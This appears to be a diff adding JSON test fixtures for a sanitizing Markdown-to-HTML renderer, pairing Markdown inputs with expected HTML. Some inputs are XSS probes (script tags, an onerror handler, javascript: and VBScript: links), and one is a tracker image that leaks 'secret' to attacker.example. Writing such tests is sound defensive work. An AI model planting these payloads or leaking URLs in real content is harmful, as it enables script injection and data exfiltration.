+   "md": "# Plan\n\n<script>alert(1)</script>\n<img src=x onerror=alert(2)>\n\n[click](javascript:alert(3)) and [docs](https://example.com/docs) and [sibling](other.md)\n\n![tracker](https://attacker.example/leak.png?d=secret)\n",
+   "html": "<h1>Plan</h1>\n<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n<p><a href=\"\">click</a> and <a href=\"https://example.com/docs\" rel=\"noopener noreferrer nofollow\">docs</a> <span class=\"url\">(https://example.com/docs)</span> and <a href=\"other.md\">sibling</a></p>\n<p><img src=\"https://attacker.example/leak.png?d=secret\" alt=\"tracker\"></p>\n"
+  },
+  {
+   "name": "custom 1",
+   "md": "Hello <script>x</script> **team**",
+   "html": "<p>Hello <!-- raw HTML omitted -->x<!-- raw HTML omitted --> <strong>team</strong></p>\n"
+  },
+  {
+   "name": "custom 2",
+   "md": "Chapters **2 and 3** overlap.<script>alert(1)</script>",
+   "html": "<p>Chapters <strong>2 and 3</strong> overlap.<!-- raw HTML omitted -->alert(1)<!-- raw HTML omitted --></p>\n"
+  },
+  {
+   "name": "custom 3",
+   "md": "*https://x.com* and ~a~ and ~~b~~ see https://a.com/x. or www.b.com (https://c.com/p) bob@ex.com",
+   "html": "<p><em><a href=\"https://x.com\" rel=\"noopener noreferrer nofollow\">https://x.com</a></em> and <del>a</del> and <del>b</del> see <a href=\"https://a.com/x\" rel=\"noopener noreferrer nofollow\">https://a.com/x</a>. or <a href=\"http://www.b.com\" rel=\"noopener noreferrer nofollow\">www.b.com</a> (<a href=\"https://c.com/p\" rel=\"noopener noreferrer nofollow\">https://c.com/p</a>) <a href=\"mailto:bob@ex.com\" rel=\"noopener noreferrer nofollow\">bob@ex.com</a></p>\n"
+  },
+  {
+   "name": "custom 4",
+   "md": "- [ ] todo\n- [x] done\n- [X] also\n- not [ ] a task\n\n1. [ ] numbered",
+   "html": "<ul>\n<li><input disabled=\"\" type=\"checkbox\"> todo</li>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> done</li>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> also</li>\n<li>not [ ] a task</li>\n</ul>\n<ol>\n<li><input disabled=\"\" type=\"checkbox\"> numbered</li>\n</ol>\n"
+  },
+  {
+   "name": "custom 5",
+   "md": "| a | b |\n|:-|-:|\n| 1 | 2 |",
+   "html": "<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">a</th>\n<th style=\"text-align:right\">b</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">1</td>\n<td style=\"text-align:right\">2</td>\n</tr>\n</tbody>\n</table>\n"
+  },
+  {
+   "name": "custom 6",
+   "md": "[t](https://x.com \"Tom &amp; Jerry\") [e](<https://x.com/a b>) [m](mailto:a@b.com) [p](//proto.rel/x) [d](data:image/png;base64,AAA) [v](VBScript:x)",
+   "html": "<p><a href=\"https://x.com\" rel=\"noopener noreferrer nofollow\" title=\"Tom &amp;amp; Jerry\">t</a> <span class=\"url\">(https://x.com)</span> <a href=\"https://x.com/a%20b\" rel=\"noopener noreferrer nofollow\">e</a> <span class=\"url\">(https://x.com/a b)</span> <a href=\"mailto:a@b.com\" rel=\"noopener noreferrer nofollow\">m</a> <span class=\"url\">(mailto:a@b.com)</span> <a href=\"//proto.rel/x\" rel=\"noopener noreferrer nofollow\">p</a> <span class=\"url\">(//proto.rel/x)</span> <a href=\"data:image/png;base64,AAA\">d</a> <a href=\"\">v</a></p>\n"
+  },
+  {
+   "name": "custom 7",
+   "md": "<https://auto.link/x?y=1&z=2> <bob@example.com> <mailto:x@y.z>",
+   "html": "<p><a href=\"https://auto.link/x?y=1&amp;z=2\" rel=\"noopener noreferrer nofollow\">https://auto.link/x?y=1&amp;z=2</a> <a href=\"mailto:bob@example.com\" rel=\"noopener noreferrer nofollow\">bob@example.com</a> <a href=\"mailto:x@y.z\" rel=\"noopener noreferrer nofollow\">mailto:x@y.z</a></p>\n"
+  },
+  {
+   "name": "custom 8",
+   "md": "![a *b* <http://x>](img.png \"T &amp; \\\"q\\\"\") ![](data:image/png;base64,xx) ![x](javascript:y)",
+   "html": "<p><img src=\"img.png\" alt=\"a b \" title=\"T &amp; &quot;q&quot;\"> <img src=\"data:image/png;base64,xx\" alt=\"\"> <img src=\"\" alt=\"x\"></p>\n"
+  },
+  {
+   "name": "custom 9",
+   "md": "[weird](https://x.com/ä ö?q=\"1\"<>) [esc](https://x.com/\\_a\\_)",
+   "html": "<p>[weird](<a href=\"https://x.com/\" rel=\"noopener noreferrer nofollow\">https://x.com/</a>ä ö?q=&quot;1&quot;&lt;&gt;) <a href=\"https://x.com/_a_\" rel=\"noopener noreferrer nofollow\">esc</a> <span class=\"url\">(https://x.com/\\_a\\_)</span></p>\n"
+  },
+  {
+   "name": "custom 10",
+   "md": "Use [optional] args: https://x.com and [unclosed https://y.com",
+   "html": "<p>Use [optional] args: <a href=\"https://x.com\" rel=\"noopener noreferrer nofollow\">https://x.com</a> and [unclosed https://y.com</p>\n"
+  },
+  {
+   "name": "custom 11",
+   "md": "```go\nfmt.Println(\"<hi>\")\n```\n\n    indented <code>\n\n`code <b>`",
+   "html": "<pre><code class=\"language-go\">fmt.Println(&quot;&lt;hi&gt;&quot;)\n</code></pre>\n<pre><code>indented &lt;code&gt;\n</code></pre>\n<p><code>code &lt;b&gt;</code></p>\n"
+  },
+  {
+   "name": "custom 12",
+   "md": "Line one  \nline two\\\nline three\nline four",
+   "html": "<p>Line one<br>\nline two<br>\nline three\nline four</p>\n"
+  },
+  {
+   "name": "custom 13",
+   "md": "> quote with https://q.com\n>\n> - list\n\n---\n\n***bold italic*** _u_ __s__",
+   "html": "<blockquote>\n<p>quote with <a href=\"https://q.com\" rel=\"noopener noreferrer nofollow\">https://q.com</a></p>\n<ul>\n<li>list</li>\n</ul>\n</blockquote>\n<hr>\n<p><em><strong>bold italic</strong></em> <em>u</em> <strong>s</strong></p>\n"
+  },
+  {
+   "name": "custom 14",
+   "md": "<!--\ncomment\n-->\n\n<div>\nblock\n</div>\n\n<pre>\nx\n</pre>\n\ntext <span>inline</span> &copy; &#x41; &#0; \\* \\<",
+   "html": "<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n<!-- raw HTML omitted -->\n<p>text <!-- raw HTML omitted -->inline<!-- raw HTML omitted --> © A � * &lt;</p>\n"
+  },
+  {
+   "name": "custom 15",
+   "md": "www.commonmark.org/he<lp and https://x.com/a)b) and https://x.com/&amp; and https://x.com/&hl; done.",
+   "html": "<p><a href=\"http://www.commonmark.org/he\" rel=\"noopener noreferrer nofollow\">www.commonmark.org/he</a>&lt;lp and <a href=\"https://x.com/a)\" rel=\"noopener noreferrer nofollow\">https://x.com/a)</a>b) and <a href=\"https://x.com/\" rel=\"noopener noreferrer nofollow\">https://x.com/</a>&amp; and <a href=\"https://x.com/\" rel=\"noopener noreferrer nofollow\">https://x.com/</a>&amp;hl; done.</p>\n"
+  },
+  {
+   "name": "custom 16",
+   "md": "email: foo.bar@baz.co.uk, x@y and a@b.c- and a@b.c_ and a@b.c.",
+   "html": "<p>email: <a href=\"mailto:foo.bar@baz.co.uk\" rel=\"noopener noreferrer nofollow\">foo.bar@baz.co.uk</a>, x@y and a@b.c- and a@b.c_ and <a href=\"mailto:a@b.c\" rel=\"noopener noreferrer nofollow\">a@b.c</a>.</p>\n"
+  },
+  {
+   "name": "custom 17",
+   "md": "~~~not strike~~~ ~~~https://x.com and a~b~c and ~one~two~",
+   "html": "<pre><code class=\"language-not\"></code></pre>\n"
+  },
+  {
+   "name": "custom 18",
+   "md": "Résumé ünïcödé — “quotes” and emoji 🎉 http://ünï.com",
+   "html": "<p>Résumé ünïcödé — “quotes” and emoji 🎉 http://ünï.com</p>\n"
+  },
+  {
+   "name": "custom 19",
+   "md": "| x |\n|---|\n\n| a | b |\n|---|---|\n| only one |\n| 1 | 2 | 3 |",
+   "html": "<table>\n<thead>\n<tr>\n<th>x</th>\n</tr>\n</thead>\n</table>\n<table>\n<thead>\n<tr>\n<th>a</th>\n<th>b</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>only one</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n"
+  },
+  {
+   "name": "custom 20",
+   "md": "1. one\n2. two\n\n   para\n3) three\n\n5. five",
+   "html": "<ol>\n<li>\n<p>one</p>\n</li>\n<li>\n<p>two</p>\n<p>para</p>\n</li>\n</ol>\n<ol start=\"3\">\n<li>three</li>\n</ol>\n<ol start=\"5\">\n<li>five</li>\n</ol>\n"
+  },
+  {
+   "name": "custom 21",
+   "md": "Setext\n===\n\nH2\n---\n\n# H1 #\n###### H6",
+   "html": "<h1>Setext</h1>\n<h2>H2</h2>\n<h1>H1</h1>\n<h6>H6</h6>\n"
+  },
+  {
+   "name": "custom 22",
+   "md": "foo(https://x.com/p)bar and (www.x.com) and *www.y.com* and _https://z.com_",
+   "html": "<p>foo(<a href=\"https://x.com/p)bar\" rel=\"noopener noreferrer nofollow\">https://x.com/p)bar</a> and (<a href=\"http://www.x.com\" rel=\"noopener noreferrer nofollow\">www.x.com</a>) and <em><a href=\"http://www.y.com\" rel=\"noopener noreferrer nofollow\">www.y.com</a></em> and <em><a href=\"https://z.com\" rel=\"noopener noreferrer nofollow\">https://z.com</a></em></p>\n"
+  },
+  {
+   "name": "custom 23",
+   "md": "a\n\n[ref]: https://ref.example \"Ref Title\"\n\n[ref] and [text][ref] and ![img][ref]",
+   "html": "<p>a</p>\n<p><a href=\"https://ref.example\" rel=\"noopener noreferrer nofollow\" title=\"Ref Title\">ref</a> <span class=\"url\">(https://ref.example)</span> and <a href=\"https://ref.example\" rel=\"noopener noreferrer nofollow\" title=\"Ref Title\">text</a> <span class=\"url\">(https://ref.example)</span> and <img src=\"https://ref.example\" alt=\"img\" title=\"Ref Title\"></p>\n"
+  },
+  {
+   "name": "custom 24",
+   "md": "- [ ]\n- [x]   spaced\n-  [ ] item\n\n* [ ] # heading?",
+   "html": "<ul>\n<li><input disabled=\"\" type=\"checkbox\"> </li>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> spaced</li>\n<li><input disabled=\"\" type=\"checkbox\"> item</li>\n</ul>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> # heading?</li>\n</ul>\n"
+  },
+  {
+   "name": "custom 25",
+   "md": "\\[not a link](https://x.com) and https://x.com\\* and `https://code.com`",
+   "html": "<p>[not a link](<a href=\"https://x.com\" rel=\"noopener noreferrer nofollow\">https://x.com</a>) and <a href=\"https://x.com\" rel=\"noopener noreferrer nofollow\">https://x.com</a>* and <code>https://code.com</code></p>\n"
+  },
+  {
+   "name": "custom 26",
+   "md": "Tabs\there https://x.com\tafter",
+   "html": "<p>Tabs\there <a href=\"https://x.com\" rel=\"noopener noreferrer nofollow\">https://x.com</a>\tafter</p>\n"
+  },
+  {
+   "name": "custom 27",
+   "md": "<a href=\"https://x.com\">raw link</a> https://y.com",
+   "html": "<p><!-- raw HTML omitted -->raw link<!-- raw HTML omitted --> <a href=\"https://y.com\" rel=\"noopener noreferrer nofollow\">https://y.com</a></p>\n"
+  },
+  {
+   "name": "custom 28",
+   "md": "&lt;script&gt; and &amp;amp; and AT&T and 3 < 4 > 2 \"quoted\" 'single'",
+   "html": "<p>&lt;script&gt; and &amp;amp; and AT&amp;T and 3 &lt; 4 &gt; 2 &quot;quoted&quot; 'single'</p>\n"
+  },
+  {
+   "name": "custom 29",
+   "md": "x\u0000y",
+   "html": "<p>x�y</p>\n"
+  },
+  {
+   "name": "more 0",
+   "md": "Windows\r\nline endings\r\n\r\n- a\r\n- b\r\n",
+   "html": "<p>Windows\nline endings</p>\n<ul>\n<li>a</li>\n<li>b</li>\n</ul>\n"
+  },
+  {
+   "name": "more 1",
+   "md": "snake_case_word and __init__ and *a*b*c* and **bold**text",
+   "html": "<p>snake_case_word and <strong>init</strong> and <em>a</em>b<em>c</em> and <strong>bold</strong>text</p>\n"
+  },
+  {
+   "name": "more 2",
+   "md": "See (https://example.com/a_(b)_c) and https://example.com/path?x=1&y=2#frag.",
+   "html": "<p>See (<a href=\"https://example.com/a_(b)_c\" rel=\"noopener noreferrer nofollow\">https://example.com/a_(b)_c</a>) and <a href=\"https://example.com/path?x=1&amp;y=2#frag\" rel=\"noopener noreferrer nofollow\">https://example.com/path?x=1&amp;y=2#frag</a>.</p>\n"
+  },
+  {
+   "name": "more 3",
+   "md": "Contact alice@example.com or (bob@example.org). Not: @handle, a@b, user@localhost",
+   "html": "<p>Contact <a href=\"mailto:alice@example.com\" rel=\"noopener noreferrer nofollow\">alice@example.com</a> or (<a href=\"mailto:bob@example.org\" rel=\"noopener noreferrer nofollow\">bob@example.org</a>). Not: @handle, a@b, user@localhost</p>\n"
+  },
+  {
+   "name": "more 4",
+   "md": "| Col `a|b` | **B** |\n| --- | :---: |\n| [l](https://x.com) | ~~s~~ |\n| \\| esc | x |",
+   "html": "<p>| Col <code>a|b</code> | <strong>B</strong> |\n| --- | :---: |\n| <a href=\"https://x.com\" rel=\"noopener noreferrer nofollow\">l</a> <span class=\"url\">(https://x.com)</span> | <del>s</del> |\n| | esc | x |</p>\n"
+  },
+  {
+   "name": "more 5",
+   "md": "## Summary\n\n1. **First** — done ✅\n2. _Second_: https://docs.example.com/v2/\n   - nested https://n.example\n   - [x] checked inside\n\n> **Note:** quoted www.example.com/q?a=b.\n",
+   "html": "<h2>Summary</h2>\n<ol>\n<li><strong>First</strong> — done ✅</li>\n<li><em>Second</em>: <a href=\"https://docs.example.com/v2/\" rel=\"noopener noreferrer nofollow\">https://docs.example.com/v2/</a>\n<ul>\n<li>nested <a href=\"https://n.example\" rel=\"noopener noreferrer nofollow\">https://n.example</a></li>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> checked inside</li>\n</ul>\n</li>\n</ol>\n<blockquote>\n<p><strong>Note:</strong> quoted <a href=\"http://www.example.com/q?a=b\" rel=\"noopener noreferrer nofollow\">www.example.com/q?a=b</a>.</p>\n</blockquote>\n"
+  },
+  {
+   "name": "more 6",
+   "md": "Text with trailing spaces   \nand a hard break\\\nend",
+   "html": "<p>Text with trailing spaces<br>\nand a hard break<br>\nend</p>\n"
+  },
+  {
+   "name": "more 7",
+   "md": "~~deleted~~ ~single~ ~~~fence-like~~~\n\n~~~\ncode fence with tildes\n~~~",
+   "html": "<p><del>deleted</del> <del>single</del> ~~~fence-like~~~</p>\n<pre><code>code fence with tildes\n</code></pre>\n"
+  },
+  {
+   "name": "more 8",
+   "md": "Image ![alt with **bold** and `code`](https://i.example/x.png \"title\")",
+   "html": "<p>Image <img src=\"https://i.example/x.png\" alt=\"alt with bold and code\" title=\"title\"></p>\n"
+  },
+  {
+   "name": "more 9",
+   "md": "Autolink <https://a.example/path with space> and <ftp://f.example>",
+   "html": "<p>Autolink &lt;https://a.example/path with space&gt; and <a href=\"ftp://f.example\" rel=\"noopener noreferrer nofollow\">ftp://f.example</a></p>\n"
+  },
+  {
+   "name": "more 10",
+   "md": "Raw <b>bold</b> and <!-- c --> and <?php x ?> and <![CDATA[x]]> and </closing>",
+   "html": "<p>Raw <!-- raw HTML omitted -->bold<!-- raw HTML omitted --> and <!-- raw HTML omitted --> and <!-- raw HTML omitted --> and <!-- raw HTML omitted --> and <!-- raw HTML omitted --></p>\n"
+  },
+  {
+   "name": "more 11",
+   "md": "<details>\n<summary>S</summary>\n\nInside **md**\n\n</details>",
+   "html": "<!-- raw HTML omitted -->\n<p>Inside <strong>md</strong></p>\n<!-- raw HTML omitted -->\n"
+  },
+  {
+   "name": "more 12",
+   "md": "Ünïcödé *émphasis* and «guillemets» _under_score_ and 日本語のテキスト https://例え.jp/パス",
+   "html": "<p>Ünïcödé <em>émphasis</em> and «guillemets» <em>under_score</em> and 日本語のテキスト https://例え.jp/パス</p>\n"
+  },
+  {
+   "name": "more 13",
+   "md": "https://x.com/path_with_underscores_ and https://x.com/~user/ and http://localhost:8080/x",
+   "html": "<p><a href=\"https://x.com/path_with_underscores\" rel=\"noopener noreferrer nofollow\">https://x.com/path_with_underscores</a>_ and <a href=\"https://x.com/~user/\" rel=\"noopener noreferrer nofollow\">https://x.com/~user/</a> and http://localhost:8080/x</p>\n"
+  },
+  {
+   "name": "more 14",
+   "md": "Trailing: https://x.com/a. https://x.com/b, https://x.com/c! https://x.com/d? https://x.com/e: https://x.com/f*",
+   "html": "<p>Trailing: <a href=\"https://x.com/a\" rel=\"noopener noreferrer nofollow\">https://x.com/a</a>. <a href=\"https://x.com/b\" rel=\"noopener noreferrer nofollow\">https://x.com/b</a>, <a href=\"https://x.com/c\" rel=\"noopener noreferrer nofollow\">https://x.com/c</a>! <a href=\"https://x.com/d\" rel=\"noopener noreferrer nofollow\">https://x.com/d</a>? <a href=\"https://x.com/e\" rel=\"noopener noreferrer nofollow\">https://x.com/e</a>: <a href=\"https://x.com/f\" rel=\"noopener noreferrer nofollow\">https://x.com/f</a>*</p>\n"
+  },
+  {
+   "name": "more 15",
+   "md": "Entities in links [a](https://x.com/?a=1&amp;b=2) [b](https://x.com/&#x41;) [c](https://x.com/\\&)",
+   "html": "<p>Entities in links <a href=\"https://x.com/?a=1&amp;b=2\" rel=\"noopener noreferrer nofollow\">a</a> <span class=\"url\">(https://x.com/?a=1&amp;amp;b=2)</span> <a href=\"https://x.com/A\" rel=\"noopener noreferrer nofollow\">b</a> <span class=\"url\">(https://x.com/&amp;#x41;)</span> <a href=\"https://x.com/&amp;\" rel=\"noopener noreferrer nofollow\">c</a> <span class=\"url\">(https://x.com/\\&amp;)</span></p>\n"
+  },
+  {
+   "name": "more 16",
+   "md": "Footnote-ish [^1] and [^1]: nope\n\nDefinition\n: list?",
+   "html": "<p>Footnote-ish [^1] and [^1]: nope</p>\n<p>Definition\n: list?</p>\n"
+  },
+  {
+   "name": "more 17",
+   "md": "1) paren list\n2) second\n\n- [ ] task with https://t.example\n- [x] ~~done~~ task",
+   "html": "<ol>\n<li>paren list</li>\n<li>second</li>\n</ol>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> task with <a href=\"https://t.example\" rel=\"noopener noreferrer nofollow\">https://t.example</a></li>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> <del>done</del> task</li>\n</ul>\n"
+  },
+  {
+   "name": "more 18",
+   "md": "    code block with https://not.linked\n\n`inline https://not.linked`",
+   "html": "<pre><code>code block with https://not.linked\n</code></pre>\n<p><code>inline https://not.linked</code></p>\n"
+  },
+  {
+   "name": "more 19",
+   "md": "Heading with link\n=================\n\n[![badge](https://b.example/b.svg)](https://link.example)",
+   "html": "<h1>Heading with link</h1>\n<p><a href=\"https://link.example\" rel=\"noopener noreferrer nofollow\"><img src=\"https://b.example/b.svg\" alt=\"badge\"></a> <span class=\"url\">(https://link.example)</span></p>\n"
+  },
+  {
+   "name": "more 20",
+   "md": "a  \n  b\n\n\tc\n\nd\t\ne",
+   "html": "<p>a<br>\nb</p>\n<pre><code>c\n</code></pre>\n<p>d\ne</p>\n"
+  },
+  {
+   "name": "more 21",
+   "md": "*foo https://x.com*bar and **https://y.com** and _www.z.com_",
+   "html": "<p><em>foo <a href=\"https://x.com\" rel=\"noopener noreferrer nofollow\">https://x.com</a></em>bar and <strong><a href=\"https://y.com\" rel=\"noopener noreferrer nofollow\">https://y.com</a></strong> and <em><a href=\"http://www.z.com\" rel=\"noopener noreferrer nofollow\">www.z.com</a></em></p>\n"
+  },
+  {
+   "name": "more 22",
+   "md": "Nested [link with `code` and **bold**](https://x.com/\"q\") end",
+   "html": "<p>Nested <a href=\"https://x.com/%22q%22\" rel=\"noopener noreferrer nofollow\">link with <code>code</code> and <strong>bold</strong></a> <span class=\"url\">(https://x.com/&quot;q&quot;)</span> end</p>\n"
+  },
+  {
+   "name": "more 23",
+   "md": "Para\n***\nmore\n___\nmore\n- - -",
+   "html": "<p>Para</p>\n<hr>\n<p>more</p>\n<hr>\n<p>more</p>\n<hr>\n"
+  },
+  {
+   "name": "more 24",
+   "md": "&nbsp;&copy;&notanentity;&#9731;&#x1F600;&#99999999;",
+   "html": "<p> ©&amp;notanentity;☃😀&amp;#99999999;</p>\n"
+  }
+ ]
+}
